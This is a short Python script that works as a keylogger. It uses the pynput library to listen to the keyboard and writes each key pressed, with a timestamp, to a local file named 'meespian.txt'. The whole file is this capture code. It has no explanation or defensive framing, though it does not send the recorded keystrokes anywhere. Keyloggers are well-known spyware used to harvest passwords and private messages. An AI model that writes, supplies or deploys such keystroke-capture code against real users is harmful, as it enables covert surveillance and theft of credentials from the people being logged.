from pynput.keyboard \
    import Listener
import logging

logging.basicConfig(
    filename=("meespian.txt"),
    level=logging.DEBUG,
    format=" %(asctime)s-%(message)s"
)

def on_Press(key):
    logging.info(str(key))

with Listener(on_press=on_Press) \
    as listener:
    listener.join()

